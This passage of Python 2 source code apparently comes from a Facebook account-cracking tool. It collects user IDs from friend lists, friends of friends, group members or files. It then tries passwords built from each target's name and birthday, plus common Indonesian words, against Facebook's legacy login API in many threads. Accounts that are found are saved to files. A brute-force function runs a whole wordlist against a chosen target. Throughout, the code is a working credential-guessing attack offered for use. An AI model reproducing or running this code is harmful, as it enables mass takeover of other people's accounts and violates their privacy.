        jalan(('{}[{}✺{}] {}Open password{}...{}').format(red, green, red, white, black, finished))
        time.sleep(2)
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        pz1 = a['first_name'] + '123'
        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        y = json.load(data)
        if 'access_token' in y:
            print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
            print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
            print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
            print (('{}[{}➹{}] {}Password {}: {}' + pz1 + '{}').format(red, green, red, white, red, green, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            menu_hack()
        elif 'www.facebook.com' in y['error_msg']:
            print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
            print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
            print '\x1b[1;91m[\x1b[1;96m✓\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
            print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
            print (('{}[{}➹{}] {}Password {}: {}' + pz1 + '{}').format(red, green, red, white, red, green, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            menu_hack()
        else:
            pz2 = a['first_name'] + '12345'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                print (('{}[{}➹{}] {}Password {}: {}' + pz2 + '{}').format(red, green, red, white, red, green, finished))
                raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                menu_hack()
            elif 'www.facebook.com' in y['error_msg']:
                print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
                print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                print (('{}[{}➹{}] {}Password {}: {}' + pz2 + '{}').format(red, green, red, white, red, green, finished))
                raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                menu_hack()
            else:
                pz3 = a['last_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = json.load(data)
                if 'access_token' in y:
                    print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                    print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                    print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                    print (('{}[{}➹{}] {}Password {}: {}' + pz3 + '{}').format(red, green, red, white, red, green, finished))
                    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                    menu_hack()
                elif 'www.facebook.com' in y['error_msg']:
                    print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                    print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
                    print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                    print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                    print (('{}[{}➹{}] {}Password {}: {}' + pz3 + '{}').format(red, green, red, white, red, green, finished))
                    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                    menu_hack()
                else:
                    lahir = a['birthday']
                    pz4 = lahir.replace('/', '')
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                        print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                        print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                        print (('{}[{}➹{}] {}Password {}: {}' + pz4 + '{}').format(red, green, red, white, red, green, finished))
                        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                        menu_hack()
                    elif 'www.facebook.com' in y['error_msg']:
                        print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                        print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
                        print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                        print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                        print (('{}[{}➹{}] {}Password {}: {}' + pz4 + '{}').format(red, green, red, white, red, green, finished))
                        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                        menu_hack()
                    else:
                        lahirs = a['birthday']
                        gaz = lahirs.replace('/', '')
                        pz5 = a['first_name'] + gaz
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = json.load(data)
                        if 'access_token' in y:
                            print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                            print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                            print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                            print (('{}[{}➹{}] {}Password {}: {}' + pz5 + '{}').format(red, green, red, white, red, green, finished))
                            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                            menu_hack()
                        elif 'www.facebook.com' in y['error_msg']:
                            print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                            print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
                            print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                            print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                            print (('{}[{}➹{}] {}Password {}: {}' + pz5 + '{}').format(red, green, red, white, red, green, finished))
                            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                            menu_hack()
                        else:
                            pz6 = 'bintang123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                                print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                                print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                                print (('{}[{}➹{}] {}Password {}: {}' + pz6 + '{}').format(red, green, red, white, red, green, finished))
                                raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                                menu_hack()
                            elif 'www.facebook.com' in y['error_msg']:
                                print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                                print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
                                print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                                print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                                print (('{}[{}➹{}] {}Password {}: {}' + pz6 + '{}').format(red, green, red, white, red, green, finished))
                                raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                                menu_hack()
                            else:
                                pz7 = 'sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                y = json.load(data)
                                if 'access_token' in y:
                                    print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                                    print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                                    print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                                    print (('{}[{}➹{}] {}Password {}: {}' + pz7 + '{}').format(red, green, red, white, red, green, finished))
                                    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                                    menu_hack()
                                elif 'www.facebook.com' in y['error_msg']:
                                    print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                                    print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
                                    print (('{}[{}✓{}] {}Name     {}: {}' + a['name'] + '{}').format(red, green, red, white, red, green, finished))
                                    print (('{}[{}➹{}] {}Username {}: {}' + id + '{}').format(red, green, red, white, red, green, finished))
                                    print (('{}[{}➹{}] {}Password {}: {}' + pz7 + '{}').format(red, green, red, white, red, green, finished))
                                    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                                    menu_hack()
                                else:
                                    print (('{}[!] Sorry, failed to open the target password, try it another way :({}').format(red, finished))
                                    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                                    menu_hack()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_hack()
        #Function_The_End
def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(1)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    idlist = raw_input(('{}[{}+{}] {}File ID  {}: {}').format(red, white, red, green, red, finished))
    passw = raw_input(('{}[{}+{}] {}Password {}: {}').format(red, yellow, red, green, red, finished))
    try:
        file = open(idlist, 'r')
        jalan(('{}[{}✺{}] {}Start cracking{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        for x in range(40):
            array = threading.Thread(target=scrak, args=())
            array.start()
            threads.append(array)
        for array in threads:
            array.join()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_hack()
def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('/sdcard/HTTPNET/mbf_ok.txt', 'w')
                bisa.write(username + '|' + passw + '\n')
                bisa.close()
                x = requests.get('https://graph.facebook.com/' + username + '?access_token=' + mpsh['access_token'])
                z = json.loads(x.text)
                berhasil.append(('{}[{} OK✓ {}] {}' + username + '|' + passw + ' =>' + z['name']).format(red, green, red, white))
            elif 'www.facebook.com' in mpsh['error_msg']:
                cek = open('/sdcard/HTTPNET/mbf_cp.txt', 'w')
                cek.write(username + '|' + passw + '\n')
                cek.close()
                cekpoint.append(('{}[{} CP\xe2\x9c\x9a {}] {}' + username + '|' + passw).format(red, yellow, red, white))
            else:
                gagal.append(username)
                back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m✸\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        time.sleep(0.01)
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
def hasil():
    print
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    for b in berhasil:
        print b
    for c in cekpoint:
        print c
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}x{}] {}Failed {}--> ' + str(len(gagal)) + '{}').format(red, green, red, yellow, white, finished))
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_hack()
    #Function_The_End
def super():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.0)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Crack from friend{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Crack friend of friends{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Crack from group member{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}04{}] {}Crack from file{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    pilih_super()
def pilih_super():
    global oks
    peak = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if peak == '':
        print '\x1b[1;91m[! Salah pilih yang benar'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            banner_1()
            print 48 * (('{}─{}').format(black, finished))
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
        elif peak == '2':
            os.system('clear')
            banner_1()
            print 48 * (('{}─{}').format(black, finished))
            idt = raw_input (('{}[{}+{}] {}Input friend/Id {}: {}').format(red, yellow, red, green, red, white))
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print (('{}[{}✓{}] {}Profile Name {}: {}' + op['name'] + '{}').format(red, green, red, green, red, white, finished))
            except KeyError:
                print (('{}[!] Error!').format(red, finished))
                raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                super()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif peak == '3':
            os.system('clear')
            banner_1()
            print 48 * (('{}─{}').format(black, finished))
            idg = raw_input (('{}[{}+{}] {}Input group/id {}: {}').format(red, yellow, red, green, red, finished))
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                asw = json.loads(r.text)
                print (('{}[{}✓{}] {}Name group {}: {}' + asw['name'] + '{}').format(red, green, red, green, red, white, finished))
            except KeyError:
                print (('{}[!] Error!').format(red, finished))
                raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                super()
            jalan (('{}[{}✺{}] {}Getting all account from group{}...{}').format(red, green, red, green, black, finished))
            jalan(('{}[{}✸{}] {}Start cracking{}...{}').format(red, cyan, red, green, black, finished))
            print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
            re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=9999999999999&access_token=' + toket)
            s = json.loads(re.text)
            for p in s['data']:
                id.append(p['id'])
        elif peak == '4':
            os.system('clear')
            banner_1()
            print 48 * (('{}─{}').format(black, finished))
            try:
                idlist = raw_input(('{}[{}+{}] {}File ID  {}: {}').format(red, yellow, red, green, red, finished))
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print (('{}[!] Error!').format(red, finished))
                raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
                super()
        elif peak == '0':
            menu_hack()
        else:
            run ('[!] Invalid input!')
            time.sleep(2)
            super()
        jalan (('{}[{}✺{}] {}Getting all account from friends{}...{}').format(red, green, red, green, black, finished))
        print (('{}[{}+{}] {}Total ID {}: {}' + str(len(id)) + '{}').format(red, yellow, red, green, red, white, finished))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;91m[\x1b[1;96m✸\x1b[1;91m] \x1b[1;92mStart cracking\x1b[1;90m' + o,
            sys.stdout.flush()
            time.sleep(1)
    print
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    def main(arg):
        user = arg
        try:
            os.mkdir('/sdcard/HTTPNET/')
        except OSError:
            pass
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                z = json.loads(x.text)
                print (('{}[ {}✓{} ] {}' + user + '|' + pass1 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print (('{}[ {}✓{} ] {}' + user + '|' + pass2 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print (('{}[ {}✓{} ] {}' + user + '|' + pass3 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        lahir = b['birthday']
                        pass4 = lahir.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print (('{}[ {}✓{} ] {}' + user + '|' + pass4 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = ('sayang123', 'sayangku123')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print (('{}[ {}✓{} ] {}' + user + '|' + pass5 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = ('bintang123', 'bintang12345')
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print (('{}[ {}✓{} ] {}' + user + '|' + pass6 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                    b = json.loads(a.text)
                                    pass7 = ('sayang', 'doraemon', 'bintang', 'someone',
                                             'bajingan', 'anjing', 'pukimak', 'playboy')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print (('{}[ {}✓{} ] {}' + user + '|' + pass7 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                        b = json.loads(a.text)
                                        pass8 = ('januari', 'februari', 'maret123',
                                                 'april', 'mei123', 'juni123', 'juli123',
                                                 'agustus', 'september', 'november',
                                                 'desember')
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print (('{}[ {}✓{} ] {}' + user + '|' + pass8 + ' =>' + z['name'] + '{}').format(red, green, red, white, finished))
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cek = open('/sdcard/HTTPNET/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}✓{}] {}Done{}...{}').format(red, cyan, red, green, black, finished))
    print (('{}[{}+{}] {}Total {}OK{}/{}CP {}: {}' + str(len(oks)) + '{}/{}' + str(len(cekpoint)) + '{}').format(red, green, red, white, green, black, yellow, red, green, black, yellow, finished))
    print (('{}[{}+{}] {}CP File saved {}: {}Successful{}').format(red, purple, red, green, red, white, finished))
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    super()
    #Function_The_End
def brute():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    try:
        email = raw_input(('{}[{}+{}] {}ID{}/{}Email {}Target {}: {}').format(red, blue, red, green, black, green, white, red, finished))
        passw = raw_input(('{}[{}+{}] {}Wordlist ex{}:{}({}/sdcard/list.txt{}) {}: {}').format(red, yellow, red, white, red, black, yellowlite, black, red, finished))
        total = open(passw, 'r')
        total = total.readlines()
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('{}[{}✓{}] {}Target {}: {}' + email + '{}').format(red, cyan, red, green, red, white, finished))
        print (('{}[{}+{}] {}Total {}' + str(len(total)) + ' {}Password{}').format(red, white, red, green, cyan, green, finished))
        jalan (('{}[{}✺{}] {}Start{}...{}').format(red, green, red, green, black, finished))
        sandi = open(passw, 'r')
        for pw in sandi:
            try:
                pw = pw.replace('\n', '')
                sys.stdout.write(('\r{}[{}✸{}] {}Crack {}: {}' + pw + '{}').format(red, cyan, red, green, red, white, finished))
                sys.stdout.flush()
                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                mpsh = json.loads(data.text)
                if 'access_token' in mpsh:
                    dapat = open('Brute.txt', 'w')
                    dapat.write(email + ' | ' + pw + '\n')
                    dapat.close()
                    print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
                    print (('{}[{}➹{}] {}Username {}: {}' + email + '{}').format(red, blue, red, green, red, white, finished))
                    print (('{}[{}➹{}] {}Password {}: {}' + pw + '{}').format(red, blue, red, green, red, white, finished))
                    os.sys.exit()
                elif 'www.facebook.com' in mpsh['error_msg']:
                    ceks = open('Brutecekpoint.txt', 'w')
                    ceks.write(email + ' | ' + pw + '\n')
                    ceks.close()
                    print (('{}[{}+{}] {}Crack Found{}').format(red, green, red, green, finished))
                    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
                    print (('{}[{}!{}] {}Account Checkpoint!{}').format(red, green, red, white, finished))
                    print (('{}[{}➹{}] {}Username {}: {}' + email + '{}').format(red, blue, red, green, red, white, finished))
                    print (('{}[{}➹{}] {}Password {}: {}' + pw + '{}').format(red, blue, red, green, red, white, finished))
                    os.sys.exit()
            except requests.exceptions.ConnectionError:
                print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
                time.sleep(0.01)
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        tanyaw()
def tanyaw():
    why = raw_input(('{}[{}?{}] {}Want to create a wordlist{}? {}[{}y{}/{}n{}]{}: {}').format(red, green, red, white, red, black, green, black, yellow, black, red, finished))
    if why == 'y' or why == 'Y':
        wordlist()
    elif why == 'n' or why == 'N':
